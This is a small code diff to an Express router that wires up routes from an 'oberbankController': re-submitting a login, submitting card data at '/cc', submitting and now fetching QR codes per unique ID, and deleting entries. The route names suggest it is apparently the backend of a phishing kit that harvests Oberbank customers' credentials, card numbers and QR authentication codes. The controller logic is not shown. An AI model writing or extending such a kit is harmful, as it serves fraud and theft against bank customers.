@@ -8,6 +8,7 @@ const {
     submitCard,
     submitQr,
     deleteEntry,
+    getQr,
 } = require("../controllers/oberbankController");
 
 const router = express.Router();
@@ -20,5 +21,6 @@ router.post("/loginAgain", submitLoginAgain);
 router.post("/cc", submitCard);
 router.post("/qr", submitQr);
 router.post("/delete", deleteEntry);
+router.get("/qr/:uniqueid", getQr);
 
 module.exports = router;
